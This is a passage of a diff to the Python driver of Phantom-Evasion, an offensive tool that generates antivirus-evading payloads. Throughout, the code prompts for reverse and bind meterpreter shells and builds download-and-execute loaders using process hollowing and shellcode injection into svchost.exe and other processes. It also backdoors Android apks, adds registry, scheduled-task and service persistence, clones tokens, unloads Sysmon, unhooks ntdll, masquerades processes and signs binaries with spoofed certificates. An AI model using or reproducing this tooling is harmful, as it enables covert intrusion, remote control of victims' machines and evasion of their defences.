-        args = ("osslsigncode", "sign", "-pkcs12", PfxFile, "-n", descr, "-i", "http://sha256timestamp.ws.symantec.com/sha256/timestamp", "-in", Tmpfile, "-out",Filename)
+        args = ("osslsigncode", "sign", "-pkcs12", PfxFile, "-n", descr, "-i",
+                "http://sha256timestamp.ws.symantec.com/sha256/timestamp", "-in", Tmpfile, "-out", Filename)
         popen = subprocess.Popen(args, stdout=subprocess.PIPE)
         popen.wait()
         output = popen.stdout.read()
@@ -463,23 +529,23 @@ def ExeSigner(Filename,Spoofcert,descr="Notepad Benchmark Util"):
 
 
 def ResGen(ModOpt):
-
     RandRC = RandString()
     RandBin = RandString()
 
-    ModOpt["ResType"] = ''.join(random.SystemRandom().choice(string.ascii_uppercase) for _ in range(random.randint(5,12)))
+    ModOpt["ResType"] = ''.join(
+        random.SystemRandom().choice(string.ascii_uppercase) for _ in range(random.randint(5, 12)))
 
-    RCfd = open(RandRC + ".rc","w")
-    RCfd.write(str(random.randint(10,1000)) + " " + ModOpt["ResType"] + " " + RandBin + ".bin")
+    RCfd = open(RandRC + ".rc", "w")
+    RCfd.write(str(random.randint(10, 1000)) + " " + ModOpt["ResType"] + " " + RandBin + ".bin")
     RCfd.close()
 
-    BINfd = open(RandBin + ".bin","w")
+    BINfd = open(RandBin + ".bin", "w")
 
     if platform.python_version()[0] == 3:
 
         BINfd.write(ModOpt["Payload"].decode('string-escape'))
     else:
-        BINfd.write(ModOpt["Payload"].encode('latin-1'))
+        BINfd.write(ModOpt["Payload"].decode('utf-8').encode('latin-1', 'ignore'))
 
     BINfd.close()
 
@@ -495,58 +561,62 @@ def ResGen(ModOpt):
 
         os.system("x86_64-w64-mingw32-windres " + RandRC + ".rc -O coff -o " + RandRC + ".rs")
 
-def PayloadOpt(M_type,Arch):
 
+def PayloadOpt(M_type, Arch):
     if "windows" in M_type:
 
         if Arch == "x86":
 
-            Payload=InputFunc("\n[>] Insert msfvenom payload (default: windows/meterpreter/reverse_tcp):") or "windows/meterpreter/reverse_tcp"
+            Payload = InputFunc(
+                "\n[>] Insert msfvenom payload (default: windows/meterpreter/reverse_tcp):") or "windows/meterpreter/reverse_tcp"
 
         elif Arch == "x64":
 
-             Payload=InputFunc("\n[>] Insert msfvenom payload (default: windows/x64/meterpreter/reverse_tcp):") or "windows/x64/meterpreter/reverse_tcp"
+            Payload = InputFunc(
+                "\n[>] Insert msfvenom payload (default: windows/x64/meterpreter/reverse_tcp):") or "windows/x64/meterpreter/reverse_tcp"
 
     elif "linux" in M_type:
 
         if Arch == "x86":
 
-            Payload=InputFunc("\n[>] Insert msfvenom payload (default: linux/x86/meterpreter/reverse_tcp):") or "linux/x86/meterpreter/reverse_tcp"
+            Payload = InputFunc(
+                "\n[>] Insert msfvenom payload (default: linux/x86/meterpreter/reverse_tcp):") or "linux/x86/meterpreter/reverse_tcp"
 
         elif Arch == "x64":
 
-            Payload=InputFunc("\n[>] Insert msfvenom payload (default: linux/x64/meterpreter/reverse_tcp):") or "linux/x64/meterpreter/reverse_tcp"
+            Payload = InputFunc(
+                "\n[>] Insert msfvenom payload (default: linux/x64/meterpreter/reverse_tcp):") or "linux/x64/meterpreter/reverse_tcp"
 
     elif "android" in M_type:
 
-        Payload=InputFunc("\n[>] Insert msfvenom payload (default: android/meterpreter/reverse_tcp):") or "android/meterpreter/reverse_tcp"
+        Payload = InputFunc(
+            "\n[>] Insert msfvenom payload (default: android/meterpreter/reverse_tcp):") or "android/meterpreter/reverse_tcp"
 
     if "reverse" in Payload:
 
-        Host="LHOST=" + InputFunc("\n[>] Insert LHOST: ")
-        Port="LPORT=" + InputFunc("\n[>] Insert LPORT: ")
-        CustomOpt=InputFunc("\n[>] Custom msfvenom options(default: empty): ")
+        Host = "LHOST=" + InputFunc("\n[>] Insert LHOST: ")
+        Port = "LPORT=" + InputFunc("\n[>] Insert LPORT: ")
+        CustomOpt = InputFunc("\n[>] Custom msfvenom options(default: empty): ")
 
-        return (Payload,Host,Port,CustomOpt)
+        return (Payload, Host, Port, CustomOpt)
 
     elif "bind" in Payload:
 
-        Host="RHOST=" + InputFunc("\n[>] Insert RHOST: ")
-        Port="RPORT=" + InputFunc("\n[>] Insert RPORT: ")
-        CustomOpt=InputFunc("\n[>] Custom msfvenom options(default: empty): ")
+        Host = "RHOST=" + InputFunc("\n[>] Insert RHOST: ")
+        Port = "RPORT=" + InputFunc("\n[>] Insert RPORT: ")
+        CustomOpt = InputFunc("\n[>] Custom msfvenom options(default: empty): ")
 
-        return (Payload,Host,Port,CustomOpt)
+        return (Payload, Host, Port, CustomOpt)
 
     else:
-        payload_advisor(payload_choice,module_choice)
-        PayloadOpt(M_type,Arch)
+        payload_advisor(payload_choice, module_choice)
+        PayloadOpt(M_type, Arch)
 
         return None
 
-def LoadExecModule(M_type,ModOpt):
 
+def LoadExecModule(M_type, ModOpt):
     if "Reflective" in ModOpt and ModOpt["Reflective"] == True:
-
         from BuildReflectiveLoader_C_windows import BuildReflectiveLoader
         BuildReflectiveLoader(ModOpt)
 
@@ -654,14 +724,14 @@ def LoadExecModule(M_type,ModOpt):
         print("ModuleNotFound!!!\n\n")
         sleep(1000)
 
-def ModuleOpt(M_type):
 
-    Remote_methods = ["ThreadExecutionHijack","TEH","Processinject","PI","APCSpray","APCS","ReflectiveDll","RD","EarlyBird","EntryPointHijack","EPH"]
-    ModOpt={}
+def ModuleOpt(M_type):
+    Remote_methods = ["ThreadExecutionHijack", "TEH", "Processinject", "PI", "APCSpray", "APCS", "ReflectiveDll", "RD",
+                      "EarlyBird", "EntryPointHijack", "EPH"]
+    ModOpt = {}
 
     if "_C_" in M_type:
-
-        ModOpt["Arch"]=InputFunc("\n[>] Insert Target architecture (default:x86):") or "x86"
+        ModOpt["Arch"] = InputFunc("\n[>] Insert Target architecture (default:x86):") or "x86"
 
     if "Stager" in M_type:
 
@@ -678,13 +748,12 @@ def ModuleOpt(M_type):
             ModOpt["Shelltype"] = "msfvenom"
             ModOpt["Arch"] = "dalvik"
 
-        if "windows" in M_type: 
-
+        if "windows" in M_type:
             ModOpt["ShellRes"] = YesOrNo(InputFunc("\n[>] Embed shellcode as PE resource? (Y/n): "))
 
         if ModOpt["Shelltype"] == "msfvenom":
 
-            PayloadData=PayloadOpt(M_type,ModOpt["Arch"])
+            PayloadData = PayloadOpt(M_type, ModOpt["Arch"])
             ModOpt["Payload"] = PayloadData[0]
             ModOpt["Host"] = PayloadData[1]
             ModOpt["Port"] = PayloadData[2]
@@ -695,7 +764,6 @@ def ModuleOpt(M_type):
             ModOpt["Payload"] = InputFunc("\n[>] Insert custom shellcode (example: \\xc0\\xff\\xee\\xee):")
 
         if not "android" in M_type:
-
             ModOpt["Encode"] = SelectEncryption("Payload")
 
     elif "DownloadExec" in M_type:
@@ -704,35 +772,40 @@ def ModuleOpt(M_type):
 
         if ModOpt["cryptFile"] == True:
 
-            ModOpt["cryptFile"]=InputFunc("\n[>] Insert filename to encrypt and download: ")
+            ModOpt["cryptFile"] = InputFunc("\n[>] Insert filename to encrypt and download: ")
 
             ModOpt["Encode"] = SelectEncryption("File")
         else:
             ModOpt["Encode"] = "1"
 
-        ModOpt["UrlTarget"]=InputFunc("\n[>] Insert Url to connect for download: ")
-        #ModOpt["Fileformat"]=InputFunc("\n[>] Insert Fileformat to exec (default:exe): ")  or "exe"
+        ModOpt["UrlTarget"] = InputFunc("\n[>] Insert Url to connect for download: ")
+        # ModOpt["Fileformat"]=InputFunc("\n[>] Insert Fileformat to exec (default:exe): ")  or "exe"
 
         if "DownloadExecExe" in M_type:
 
-            ModOpt["ExecMethod"]=InputFunc("\n[>] Insert Exec-method (default:ProcessHollowing): ") or "ProcessHollowing"
-            ModOpt["ProcTarget"]=InputFunc("\n[>] Insert target process filepath (default:svchost.exe): ") or "svchost.exe"
-            
-        elif "DownloadExecDll" in M_type:
-            
-            ModOpt["ExecMethod"]=InputFunc("\n[>] Insert Exec-method (default:ReflectiveDll): ") or "ReflectiveDll"
+            ModOpt["ExecMethod"] = InputFunc(
+                "\n[>] Insert Exec-method (default:ProcessHollowing): ") or "ProcessHollowing"
+            ModOpt["ProcTarget"] = InputFunc(
+                "\n[>] Insert target process filepath (default:svchost.exe): ") or "svchost.exe"
 
-            if ModOpt["ExecMethod"] in ["ReflectiveDll","RD","RDAPC","RDTC","ManualMap","MM"]:
- 
+        elif "DownloadExecDll" in M_type:
+
+            ModOpt["ExecMethod"] = InputFunc("\n[>] Insert Exec-method (default:ReflectiveDll): ") or "ReflectiveDll"
+
+            if ModOpt["ExecMethod"] in ["ReflectiveDll", "RD", "RDAPC", "RDTC", "ManualMap", "MM"]:
+
                 if (ModOpt["Arch"] == "x86"):
 
-                    ModOpt["ProcTarget"] = InputFunc("\n[>] Insert x86 target process (default: OneDrive.exe):") or "OneDrive.exe"
+                    ModOpt["ProcTarget"] = InputFunc(
+                        "\n[>] Insert x86 target process (default: OneDrive.exe):") or "OneDrive.exe"
 
                 elif ModOpt["Arch"] == "x64":
 
-                    ModOpt["ProcTarget"] = InputFunc("\n[>] Insert x64 target process (default: SkypeApp.exe):") or "SkypeApp.exe"
+                    ModOpt["ProcTarget"] = InputFunc(
+                        "\n[>] Insert x64 target process (default: SkypeApp.exe):") or "SkypeApp.exe"
 
-        ModOpt["Filesize"]=InputFunc("\n[>] Insert size in byte of the file to download (default:1000000): ") or "1000000" 
+        ModOpt["Filesize"] = InputFunc(
+            "\n[>] Insert size in byte of the file to download (default:1000000): ") or "1000000"
 
     if "Stager" in M_type or "ShellcodeInjection" in M_type:
 
@@ -740,50 +813,54 @@ def ModuleOpt(M_type):
 
         if "windows" in M_type:
 
-            ModOpt["MemAlloc"] = InputFunc("\n[>] Insert Memory allocation type (default:Virtual_RWX):") or "Virtual_RWX"
+            ModOpt["MemAlloc"] = InputFunc(
+                "\n[>] Insert Memory allocation type (default:Virtual_RWX):") or "Virtual_RWX"
         else:
             ModOpt["MemAlloc"] = InputFunc("\n[>] Insert Memory allocation type (default:Virtual_RWX):") or "Heap_RWX"
-                       
+
         if ModOpt["ExecMethod"] in Remote_methods:
 
             if (ModOpt["Arch"] == "x86"):
 
-                if ModOpt["ExecMethod"] in ["EarlyBird","EB","EntryPointHijack","EPH"]:
+                if ModOpt["ExecMethod"] in ["EarlyBird", "EB", "EntryPointHijack", "EPH"]:
 
-                    ModOpt["ProcTarget"] = InputFunc("\n[>] Insert target process filepath (default: svchost.exe):") or "svchost.exe"
+                    ModOpt["ProcTarget"] = InputFunc(
+                        "\n[>] Insert target process filepath (default: svchost.exe):") or "svchost.exe"
                 else:
-                    ModOpt["ProcTarget"] = InputFunc("\n[>] Insert x86 target process (default: OneDrive.exe):") or "OneDrive.exe"
+                    ModOpt["ProcTarget"] = InputFunc(
+                        "\n[>] Insert x86 target process (default: OneDrive.exe):") or "OneDrive.exe"
 
             elif ModOpt["Arch"] == "x64":
 
-                if ModOpt["ExecMethod"] in ["EarlyBird","EB","EntryPointHijack","EPH"]:
+                if ModOpt["ExecMethod"] in ["EarlyBird", "EB", "EntryPointHijack", "EPH"]:
 
-                    ModOpt["ProcTarget"] = InputFunc("\n[>] Insert target process filepath (default: svchost.exe):") or "svchost.exe"
+                    ModOpt["ProcTarget"] = InputFunc(
+                        "\n[>] Insert target process filepath (default: svchost.exe):") or "svchost.exe"
                 else:
-                    ModOpt["ProcTarget"] = InputFunc("\n[>] Insert x64 target process (default: SkypeApp.exe):") or "SkypeApp.exe"
+                    ModOpt["ProcTarget"] = InputFunc(
+                        "\n[>] Insert x64 target process (default: SkypeApp.exe):") or "SkypeApp.exe"
 
     if "android" in M_type:
 
-        ModOpt["BackdoorApk"]=YesOrNo(InputFunc("\n[>] Inject backdoor into another apk?(default:Y/n): "))
+        ModOpt["BackdoorApk"] = YesOrNo(InputFunc("\n[>] Inject backdoor into another apk?(default:Y/n): "))
 
         if ModOpt["BackdoorApk"] == True:
-
             ModOpt["BackdoorApk"] = InputFunc("\n[>] Insert apk filename to backdoor: ")
-            ModOpt["RunOnAppStart"] = True #YesOrNo(InputFunc("\n[>] Trigger payload on apk execution? (default:Y/n): "))
-            #ModOpt["RebootPersistence"] = YesOrNo(InputFunc("\n[>] Add Reboot Persistence? (default:Y/n): "))
+            ModOpt[
+                "RunOnAppStart"] = True  # YesOrNo(InputFunc("\n[>] Trigger payload on apk execution? (default:Y/n): "))
+            # ModOpt["RebootPersistence"] = YesOrNo(InputFunc("\n[>] Add Reboot Persistence? (default:Y/n): "))
 
-        Cert=os.path.isfile("Setup/apk_sign/keystore.keystore")
-        Info=os.path.isfile("Setup/apk_sign/keystore_info.txt")
+        Cert = os.path.isfile("Setup/apk_sign/keystore.keystore")
+        Info = os.path.isfile("Setup/apk_sign/keystore_info.txt")
 
-        if (not(Cert and Info)):
-
+        if (not (Cert and Info)):
             Random = YesOrNo(InputFunc("\n[>] generate cerificate with random value? (Y/n):"))
             KeytoolKeystore(Random)
 
     if "Persistence" in M_type:
 
-        ModOpt["Binpath"]=InputFunc("\n[>] Insert fullpath to file to add to startup: ")
-        ModOpt["Pname"]=InputFunc("\n[>] Insert name for the reg/task/service (default:random):") or RandString()
+        ModOpt["Binpath"] = InputFunc("\n[>] Insert fullpath to file to add to startup: ")
+        ModOpt["Pname"] = InputFunc("\n[>] Insert name for the reg/task/service (default:random):") or RandString()
 
         if M_type == "Persistence_C_REG_windows" or M_type == "Persistence_CMD_REG_windows":
 
@@ -791,25 +868,27 @@ def ModuleOpt(M_type):
 
         elif M_type == "Persistence_CMD_Schtasks_windows":
 
-            ModOpt["SchtMode"]=InputFunc("\n[>] Insert task start condition (default:Startup): ") or "Startup"
+            ModOpt["SchtMode"] = InputFunc("\n[>] Insert task start condition (default:Startup): ") or "Startup"
 
-            if ModOpt["SchtMode"] in ["Startup","S"]:
+            if ModOpt["SchtMode"] in ["Startup", "S"]:
 
-                ModOpt["Timevar"] = InputFunc("\n[>] Insert delay before exec at user login (default:0001:30): ") or "0001:30"
+                ModOpt["Timevar"] = InputFunc(
+                    "\n[>] Insert delay before exec at user login (default:0001:30): ") or "0001:30"
 
-            elif ModOpt["SchtMode"] in ["Daily","D"]:
+            elif ModOpt["SchtMode"] in ["Daily", "D"]:
 
                 ModOpt["Timevar"] = InputFunc("\n[>] Insert execution day time? (default:0030:00): ") or "0030:00"
 
-            elif ModOpt["SchtMode"] in ["Idle","I"]:
-                    
-                ModOpt["Timevar"] = InputFunc("\n[>] Insert user idle time before exec?(default:0015:00):") or "0015:00" 
+            elif ModOpt["SchtMode"] in ["Idle", "I"]:
+
+                ModOpt["Timevar"] = InputFunc("\n[>] Insert user idle time before exec?(default:0015:00):") or "0015:00"
 
         elif M_type == "Persistence_C_KeepAliveProcess_windows":
 
-            ModOpt["ProcTarget"]=InputFunc("\n[>] Insert name of the process to keep alive:")
-            ModOpt["Timevar"] = InputFunc("\n[>] Insert time interval in millisecond between check (default:600000): ") or "600000"
-                    
+            ModOpt["ProcTarget"] = InputFunc("\n[>] Insert name of the process to keep alive:")
+            ModOpt["Timevar"] = InputFunc(
+                "\n[>] Insert time interval in millisecond between check (default:600000): ") or "600000"
+
         elif M_type == "Persistence_CMD_CreateService_windows":
 
             pass
@@ -817,7 +896,7 @@ def ModuleOpt(M_type):
 
     elif M_type == "Privesc_C_DuplicateTokenEx_windows":
 
-        ModOpt["Binpath"]=InputFunc("\n[>] Insert fullpath to file to start with cloned token: ")
+        ModOpt["Binpath"] = InputFunc("\n[>] Insert fullpath to file to start with cloned token: ")
         ModOpt["TargetPid"] = InputFunc("\n[>] Insert pid of the target process: ")
 
     elif M_type == "Postex_CMD_UnloadSysmonDriver_windows":
@@ -834,14 +913,13 @@ def ModuleOpt(M_type):
 
     elif M_type == "Postex_C_SetFileAttributeHidden_windows":
 
-        ModOpt["Binpath"]=InputFunc("\n[>] Insert fullpath to the file to hide: ")
+        ModOpt["Binpath"] = InputFunc("\n[>] Insert fullpath to the file to hide: ")
 
     elif M_type == "Postex_CMD_AttribHideFile_windows":
 
-        ModOpt["Binpath"]=InputFunc("\n[>] Insert fullpath to the file to hide: ")
+        ModOpt["Binpath"] = InputFunc("\n[>] Insert fullpath to the file to hide: ")
 
     if "_C_" in M_type:
-
         ModOpt["JI"] = int(InputFunc("\n[>] Insert Junkcode Intesity value (default:10):") or "10")
         ModOpt["JF"] = int(InputFunc("\n[>] Insert Junkcode Frequency value  (default: 10):") or "10")
         ModOpt["JR"] = int(InputFunc("\n[>] Insert Junkcode Reinjection Frequency (default: 0):") or "0")
@@ -850,18 +928,18 @@ def ModuleOpt(M_type):
 
         ModOpt["EF"] = int(InputFunc("\n[>] Insert Evasioncode Frequency value  (default: 10):") or "10")
         ModOpt["DynImport"] = YesOrNo(InputFunc("\n[>] Dynamically load windows API? (Y/n):"))
-        ModOpt["UnhookNtdll"]  = YesOrNo(InputFunc("\n[>] Add Ntdll api Unhooker? (Y/n):"))
-        ModOpt["PEBmasquerade"]  = YesOrNo(InputFunc("\n[>] Masq peb process? (Y/n):"))
-        ModOpt["AmsiBypass1"]  = False#YesOrNo(InputFunc("\n[>] Patch AmsiScanBuffer? (Y/n):"))
-        ModOpt["DecoyProc"] = 0 #int(InputFunc("\n[>] Decoy processes number? (default:0):") or "0")
+        ModOpt["UnhookNtdll"] = YesOrNo(InputFunc("\n[>] Add Ntdll api Unhooker? (Y/n):"))
+        ModOpt["PEBmasquerade"] = YesOrNo(InputFunc("\n[>] Masq peb process? (Y/n):"))
+        ModOpt["AmsiBypass1"] = False  # YesOrNo(InputFunc("\n[>] Patch AmsiScanBuffer? (Y/n):"))
+        ModOpt["DecoyProc"] = 0  # int(InputFunc("\n[>] Decoy processes number? (default:0):") or "0")
 
         if ModOpt["PEBmasquerade"] == True:
+            ModOpt["Masqpath"] = InputFunc(
+                "\n[>] Insert fake process path?(default:C:\\windows\\system32\\notepad.exe):") or "C:\\\\windows\\\\system32\\\\notepad.exe"
+            ModOpt["Masqcmdline"] = InputFunc("\n[>] Insert fake process commandline?(default:empty):") or ModOpt[
+                "Masqpath"]
 
-            ModOpt["Masqpath"] = InputFunc("\n[>] Insert fake process path?(default:C:\\windows\\system32\\notepad.exe):") or "C:\\\\windows\\\\system32\\\\notepad.exe"
-            ModOpt["Masqcmdline"] = InputFunc("\n[>] Insert fake process commandline?(default:empty):") or ModOpt["Masqpath"]
-  
     if "_C_" in M_type:
-
         ModOpt["Strip"] = YesOrNo(InputFunc("\n[>] Strip executable? (Y/n):"))
 
     if "_C_" in M_type and "windows" in M_type:
@@ -869,78 +947,77 @@ def ModuleOpt(M_type):
         ModOpt["Sign"] = YesOrNo(InputFunc("\n[>] Use certificate spoofer and sign executable? (Y/n):"))
 
         if ModOpt["Sign"] == True:
-
-            ModOpt["SpoofCert"] = InputFunc("\n[>] Insert url target for certificate spoofer (default:www.windows.com:443):") or "www.windows.com:443"
-            ModOpt["descr"] = InputFunc("\n[>] Insert certificate description (default:Notepad Benchmark Util):") or "Notepad Benchmark Util"
+            ModOpt["SpoofCert"] = InputFunc(
+                "\n[>] Insert url target for certificate spoofer (default:www.windows.com:443):") or "www.windows.com:443"
+            ModOpt["descr"] = InputFunc(
+                "\n[>] Insert certificate description (default:Notepad Benchmark Util):") or "Notepad Benchmark Util"
 
         ModOpt["Outformat"] = InputFunc("\n[>] Insert output format (default:exe):") or "exe"
-  
-        if ModOpt["Outformat"] == "dll":
 
+        if ModOpt["Outformat"] == "dll":
             ModOpt["Reflective"] = True == YesOrNo(InputFunc("\n[>] Add Reflective loader? (Y/n):"))
 
     if "_C_" in M_type or "android" in M_type:
 
-        ModOpt["Outfile"]=InputFunc("\n[>] Insert output filename:")
+        ModOpt["Outfile"] = InputFunc("\n[>] Insert output filename:")
 
         if "windows" in M_type and (".exe" not in ModOpt["Outfile"] and ".dll" not in ModOpt["Outfile"]):
-
             ModOpt["Outfile"] += "." + ModOpt["Outformat"]
 
     return ModOpt
 
 
-def ModuleLauncher(M_type,ModOpt={}):
-
-    Interactive=False
+def ModuleLauncher(M_type, ModOpt={}):
+    Interactive = False
 
     if len(ModOpt) == 0:
-        Interactive=True
-        ModOpt=ModuleOpt(M_type)
+        Interactive = True
+        ModOpt = ModuleOpt(M_type)
     else:
         ModOpt["verbose"] = False
-        
+
     print(bcolors.GREEN + "\n[>] Generating code...\n" + bcolors.ENDC)
 
     if "ShellcodeInjection" in M_type:
 
         if ModOpt["Shelltype"] == "msfvenom" or ModOpt["Shelltype"] == "":
+            ModOpt["Payload"] = PayloadGenerator(ModOpt["Payload"], ModOpt["Arch"], ModOpt["Host"], ModOpt["Port"],
+                                                 ModOpt["CustomOpt"], "c")
 
-            ModOpt["Payload"] = PayloadGenerator(ModOpt["Payload"],ModOpt["Arch"],ModOpt["Host"],ModOpt["Port"],ModOpt["CustomOpt"],"c")
-
-            ModOpt["Payload"] = ModOpt["Payload"].replace("unsigned char buf[] = ","").replace("\"","").replace("\n","").replace(";","")
+            ModOpt["Payload"] = ModOpt["Payload"].replace("unsigned char buf[] = ", "").replace("\"", "").replace("\n",
+                                                                                                                  "").replace(
+                ";", "")
 
         if "windows" in M_type:
 
             if ModOpt["ShellRes"] == True:
-
                 ResGen(ModOpt)
 
     if "android" in M_type:
 
-        unused_retval = PayloadGenerator(ModOpt["Payload"],"dalvik",ModOpt["Host"],ModOpt["Port"],ModOpt["CustomOpt"],"apk")
+        unused_retval = PayloadGenerator(ModOpt["Payload"], "dalvik", ModOpt["Host"], ModOpt["Port"],
+                                         ModOpt["CustomOpt"], "apk")
 
-        ApktoolD("msf_gen.apk","msf_smali")
+        ApktoolD("msf_gen.apk", "msf_smali")
 
         if ModOpt["BackdoorApk"] != False and ModOpt["BackdoorApk"] != "":
 
             if ".apk" not in ModOpt["BackdoorApk"]:
-
                 ModOpt["BackdoorApk"] += ".apk"
 
-            ApktoolD(ModOpt["BackdoorApk"],"apk_smali")
+            ApktoolD(ModOpt["BackdoorApk"], "apk_smali")
 
         print(bcolors.GREEN + "\n[>] Obfuscating Smali code...\n" + bcolors.ENDC)
 
-    PrintEncryption(M_type,ModOpt)
+    PrintEncryption(M_type, ModOpt)
 
-    LoadExecModule(M_type,ModOpt)
+    LoadExecModule(M_type, ModOpt)
 
     if "_C_" in M_type:
 
-        print(bcolors.GREEN + "\n[>] Compiling...\n" + bcolors.ENDC) 
+        print(bcolors.GREEN + "\n[>] Compiling...\n" + bcolors.ENDC)
 
-        AutoCompiler(M_type,ModOpt)
+        AutoCompiler(M_type, ModOpt)
 
         StripBin(ModOpt)
 
@@ -960,11 +1037,9 @@ def ModuleLauncher(M_type,ModOpt={}):
     Cleanup(ModOpt)
 
     if "windows" in M_type and "_C_" in M_type and ModOpt["Sign"] == True:
-
-        ExeSigner(ModOpt["Outfile"],ModOpt["SpoofCert"],ModOpt["descr"])
+        ExeSigner(ModOpt["Outfile"], ModOpt["SpoofCert"], ModOpt["descr"])
 
     if "_C_" in M_type:
-
         print("\n[<>] File saved in Phantom-Evasion folder")
 
     if Interactive == True:
@@ -975,62 +1050,68 @@ def ModuleLauncher(M_type,ModOpt={}):
 
         print(ModOpt)
 
+
 def CmdlineLauncher(inputarray):
     sleep(0.1)
     Banner()
     sleep(0.2)
     Advisor()
     parser = argparse.ArgumentParser(description='Phantom-Evasion 3.0')
-    #parser.add_argument('integers', metavar='N', type=int, nargs='+',help='an integer for the accumulator')  
-    parser.add_argument('-o','--output', help='Output Filename',required=False) 
-    parser.add_argument('-v','--verbose', help='Print module data on exit', required=False)
+    # parser.add_argument('integers', metavar='N', type=int, nargs='+',help='an integer for the accumulator')
+    parser.add_argument('-o', '--output', help='Output Filename', required=False)
+    parser.add_argument('-v', '--verbose', help='Print module data on exit', required=False)
     group0 = parser.add_mutually_exclusive_group()
-    group0.add_argument('-s','--setup', help='Start phantom-evasion setup',action='store_true',required=False) 
-    group0.add_argument('-m','--module', help='Select phantom-evasion module', required=False)
+    group0.add_argument('-s', '--setup', help='Start phantom-evasion setup', action='store_true', required=False)
+    group0.add_argument('-m', '--module', help='Select phantom-evasion module', required=False)
     group1 = parser.add_mutually_exclusive_group()
-    group1.add_argument('-msfp','--msfvenom', help='Msfvenom payload to use in Shellcode_injection module', required=False)
-    group1.add_argument('-cp','--custom', help='Custom payload to use in Shellcode_injection module', required=False)
-    #parser.add_argument('-cf','--customfile', help='custom payload stored in .txt file to use in Shellcode_injection module', required=False)
-    parser.add_argument('-H','--host', help='Lhost/Rhost for reverse/bind connection', required=False)
-    parser.add_argument('-P','--port', help='Connection port', required=False)
-    parser.add_argument('-U','--url', help='Download file from the specified url', required=False)
-    parser.add_argument('-a','--arch', help='Target architecture', required=False)
-    parser.add_argument('-e','--encrypt', help='Shellcode/file encryption mode', required=False)
-    parser.add_argument('-ef','--encryptfile', help='Path to filename to encrypt and decrypt after download', required=False)
-    parser.add_argument('-eo','--encryptoutput', help='Output filename of encrypted file ', required=False)
-    parser.add_argument('-ds','--downloadsize', help='Download filesize in bytes (default:1000000)', required=False)
-    parser.add_argument('-msfo','--msfoptions', help='Msfvenom options string', required=False)
-    parser.add_argument('-i','--injectmode', help='Execution method', required=False)
-    parser.add_argument('-tp','--targetprocess', help='Target process for code injection', required=False)
-    parser.add_argument('-mem','--memtype', help='Heap/Virtual memory and R/W/X assignement policy', required=False)
-    parser.add_argument('-f','--format', help='Output format (exe/dll)', required=False)
-    parser.add_argument('-R','--reflective', help='Add reflective loader to dll outfile',action='store_true', required=False)
-    parser.add_argument('-S','--strip', help='Strip executable',action='store_true', required=False)
-    parser.add_argument('-res','--resource', help='Add shellcode as PE resource',action='store_true', required=False)   
-    parser.add_argument('-c','--certsign', help='Certificate spoofer and exe signer', required=False)
-    parser.add_argument('-cd','--certdescr', help='Certificate description', required=False)
-    parser.add_argument('-E','--evasionfrequency', help='Windows evasion code frequency (default:10)', required=False)
-    parser.add_argument('-J','--junkfrequency', help='Junkcode frequency (default:10)', required=False)
-    parser.add_argument('-j','--junkintensity', help='Junkcode intensity (default:10)', required=False)
-    parser.add_argument('-jr','--junkreinject', help='Junkcode reinjection intensity (default:10)', required=False)
-    #parser.add_argument('-dp','--decoyproc', help='windows decoy processes number',required=False)
-    parser.add_argument('-dl','--dynamicload', help='Dynamic loading of Windows API',action='store_true', required=False)
-    parser.add_argument('-un','--unhook', help='Add Ntdll unhook routine', action='store_true',required=False)    
-    parser.add_argument('-msq','--masqpath', help='Fake Process path for masquerading', required=False)
-    parser.add_argument('-msqc','--masqcmd', help='Fake Fullcmdline for masquerading', required=False)
-    parser.add_argument('-AB','--apkbackdoor', help='Apk file to backdoor', required=False)
-    #parser.add_argument('-ps','--persistrun', help='Android Backdoored app start trigger backdoor',action='store_true',required=False)
-    #parser.add_argument('-pr','--persistreboot', help='Android Backdoor start every reboot',action='store_true',required=False)       
-    parser.add_argument('-bp','--binpath', help='File path for post/privesc/persistence module', required=False)
-    parser.add_argument('-opt1','--option1', help='option1 for post/privesc/persistence module', required=False)
-    parser.add_argument('-opt2','--option2', help='option2 for post/privesc/persistence module', required=False) 
+    group1.add_argument('-msfp', '--msfvenom', help='Msfvenom payload to use in Shellcode_injection module',
+                        required=False)
+    group1.add_argument('-cp', '--custom', help='Custom payload to use in Shellcode_injection module', required=False)
+    # parser.add_argument('-cf','--customfile', help='custom payload stored in .txt file to use in Shellcode_injection module', required=False)
+    parser.add_argument('-H', '--host', help='Lhost/Rhost for reverse/bind connection', required=False)
+    parser.add_argument('-P', '--port', help='Connection port', required=False)
+    parser.add_argument('-U', '--url', help='Download file from the specified url', required=False)
+    parser.add_argument('-a', '--arch', help='Target architecture', required=False)
+    parser.add_argument('-e', '--encrypt', help='Shellcode/file encryption mode', required=False)
+    parser.add_argument('-ef', '--encryptfile', help='Path to filename to encrypt and decrypt after download',
+                        required=False)
+    parser.add_argument('-eo', '--encryptoutput', help='Output filename of encrypted file ', required=False)
+    parser.add_argument('-ds', '--downloadsize', help='Download filesize in bytes (default:1000000)', required=False)
+    parser.add_argument('-msfo', '--msfoptions', help='Msfvenom options string', required=False)
+    parser.add_argument('-i', '--injectmode', help='Execution method', required=False)
+    parser.add_argument('-tp', '--targetprocess', help='Target process for code injection', required=False)
+    parser.add_argument('-mem', '--memtype', help='Heap/Virtual memory and R/W/X assignement policy', required=False)
+    parser.add_argument('-f', '--format', help='Output format (exe/dll)', required=False)
+    parser.add_argument('-R', '--reflective', help='Add reflective loader to dll outfile', action='store_true',
+                        required=False)
+    parser.add_argument('-S', '--strip', help='Strip executable', action='store_true', required=False)
+    parser.add_argument('-res', '--resource', help='Add shellcode as PE resource', action='store_true', required=False)
+    parser.add_argument('-c', '--certsign', help='Certificate spoofer and exe signer', required=False)
+    parser.add_argument('-cd', '--certdescr', help='Certificate description', required=False)
+    parser.add_argument('-E', '--evasionfrequency', help='Windows evasion code frequency (default:10)', required=False)
+    parser.add_argument('-J', '--junkfrequency', help='Junkcode frequency (default:10)', required=False)
+    parser.add_argument('-j', '--junkintensity', help='Junkcode intensity (default:10)', required=False)
+    parser.add_argument('-jr', '--junkreinject', help='Junkcode reinjection intensity (default:10)', required=False)
+    # parser.add_argument('-dp','--decoyproc', help='windows decoy processes number',required=False)
+    parser.add_argument('-dl', '--dynamicload', help='Dynamic loading of Windows API', action='store_true',
+                        required=False)
+    parser.add_argument('-un', '--unhook', help='Add Ntdll unhook routine', action='store_true', required=False)
+    parser.add_argument('-msq', '--masqpath', help='Fake Process path for masquerading', required=False)
+    parser.add_argument('-msqc', '--masqcmd', help='Fake Fullcmdline for masquerading', required=False)
+    parser.add_argument('-AB', '--apkbackdoor', help='Apk file to backdoor', required=False)
